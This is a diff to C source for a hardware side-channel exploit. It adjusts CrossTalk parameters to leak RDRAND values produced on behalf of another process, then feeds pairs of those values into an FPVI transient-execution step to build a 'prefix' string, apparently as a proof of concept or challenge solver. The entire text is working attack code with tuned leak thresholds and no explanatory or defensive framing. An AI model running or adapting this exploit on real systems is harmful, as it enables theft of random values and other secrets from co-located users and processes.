@@ -13,17 +13,17 @@
 #define NUM_SAMPLES 10000
 #define ROUNDS 100
 
-#define CROSSTALK_STRIDE 4096
+#define CROSSTALK_STRIDE 2048
 #define CROSSTALK_POSSIBLE_BYTES 256
 #define CROSSTALK_BYTES_TO_LEAK 8
 #define RDRAND_OFFSET 32
-#define RDRAND_TO_LEAK 2
+#define RDRAND_TO_LEAK 4
 #define CROSSTALK_CONFIDENCE 2
 #define CROSSTALK_TRIES 5
-#define CROSSTALK_SIMILARITY 6
-#define CROSSTALK_CONSECUTIVE_HITS 6
-#define CROSSTALK_CONSECUTIVE_NULL_MULTIPLIER 2
-#define CROSSTALK_MAX_NULL 4
+#define CROSSTALK_SIMILARITY 3
+#define CROSSTALK_CONSECUTIVE_HITS 3
+#define CROSSTALK_CONSECUTIVE_NULL_MULTIPLIER 3
+#define CROSSTALK_MAX_NULL 3
 
 // fpvi definitions
 #define MAX_NIBBLE_INDEX 16
@@ -191,8 +191,7 @@ uint64_t leak_new_rdrand(uint64_t old_rdrand, uint8_t* leak_buffer, uint8_t* rel
         // Leak the same value consecutively to ensure correctness
         // Increase required consecutive hits for the number of null bytes found
         // As null bytes can be the result, when the reload buffer has zero hits
-        if (consecutive_hits < CROSSTALK_CONSECUTIVE_NULL_MULTIPLIER * null_bytes ||
-            consecutive_hits < CROSSTALK_CONSECUTIVE_HITS) {
+        if (consecutive_hits < CROSSTALK_CONSECUTIVE_HITS + null_bytes * CROSSTALK_CONSECUTIVE_NULL_MULTIPLIER) {
             continue;
         }
 
@@ -202,7 +201,7 @@ uint64_t leak_new_rdrand(uint64_t old_rdrand, uint8_t* leak_buffer, uint8_t* rel
         }
 
         // Check that result is different enough from old_rdrand
-        if (similarity < CROSSTALK_SIMILARITY) {
+        if (similarity <= CROSSTALK_SIMILARITY) {
             return result;
         }
     }
@@ -284,9 +283,9 @@ uint64_t get_transient_result(uint64_t lhs, uint64_t rhs, uint64_t CACHE_THRESHO
 }
 
 int main(void) {
-    uint64_t old_rdrand;
-    asm volatile("rdrand %%rax" : "=a"(old_rdrand));
-    printf("Old rdrand value: 0x%016lx\n", old_rdrand);
+    // uint64_t old_rdrand;
+    // asm volatile("rdrand %%rax" : "=a"(old_rdrand));
+    // printf("Old rdrand value: 0x%016lx\n", old_rdrand);
 
     uint64_t const CACHE_THRESHOLD = get_cache_threshold() * 0.7;
     printf("Cache threshold: %lu\n", CACHE_THRESHOLD);
@@ -314,32 +313,45 @@ int main(void) {
     uint8_t *crosstalk_reloadbuffer = mmap(NULL, CROSSTALK_POSSIBLE_BYTES * CROSSTALK_STRIDE, mmap_prot, mmap_flags, -1, 0);
     if (crosstalk_reloadbuffer == MAP_FAILED) { perror("mmap reloadbuffer"); return 1; }
 
+    uint64_t old_rdrand = 0;
+
     // Leak rdrand values
     uint64_t leaked_rdrand[RDRAND_TO_LEAK] = {0};
     for (int i = 0; i < RDRAND_TO_LEAK; ++i) {
         uint64_t new_rdrand = leak_new_rdrand(old_rdrand, crosstalk_leak, crosstalk_reloadbuffer, CACHE_THRESHOLD);
 
         leaked_rdrand[i] = new_rdrand;
+        printf("Leaked rdrand value %d: 0x%016lx\n", i, leaked_rdrand[i]);
 
         old_rdrand = new_rdrand;
     }
 
-    for (int i = 0; i < RDRAND_TO_LEAK; ++i) {
-        printf("Leaked rdrand value %d: 0x%016lx\n", i, leaked_rdrand[i]);
-    }
+    // for (int i = 0; i < RDRAND_TO_LEAK; ++i) {
+    //     printf("Leaked rdrand value %d: 0x%016lx\n", i, leaked_rdrand[i]);
+    // }
 
     // FPVI on leaked rdrand values
-    uint64_t fpvi_results = 0;
+    uint64_t fpvi_results[RDRAND_TO_LEAK / 2] = {0};
 
-    uint64_t dlhs = make_denormal(leaked_rdrand[0]);
-    uint64_t drhs = make_denormal(leaked_rdrand[1]);
+    for (int i = 0; i < RDRAND_TO_LEAK / 2; ++i) {
+        uint64_t dlhs = make_denormal(leaked_rdrand[2 * i]);
+        uint64_t drhs = make_denormal(leaked_rdrand[2 * i + 1]);
 
-    printf("Denormalized lhs: 0x%016lx\n", dlhs);
-    printf("Denormalized rhs: 0x%016lx\n", drhs);
+        printf("Denormalized lhs (i: %d): 0x%016lx\n", 2 * i, dlhs);
+        printf("Denormalized rhs (i: %d): 0x%016lx\n", 2 * i + 1, drhs);
 
-    fpvi_results = get_transient_result(dlhs, drhs, CACHE_THRESHOLD);
+        fpvi_results[i] = get_transient_result(dlhs, drhs, CACHE_THRESHOLD);
+    }
 
-    printf("FPVI transient result: 0x%016lx | %lu\n", fpvi_results, fpvi_results);
+    for (int i = 0; i < RDRAND_TO_LEAK / 2; ++i) {
+        printf("FPVI transient result %d: 0x%016lx\n", i, fpvi_results[i]);
+    }
+
+    // Concatenate results to form prefix
+    char prefix[36] = {0};
+    snprintf(prefix, sizeof(prefix), "%016lx%016lx", fpvi_results[0], fpvi_results[1]);
+
+    printf("Prefix: %s\n", prefix);
 
     kill(pid, SIGKILL);
     waitpid(pid, NULL, 0);
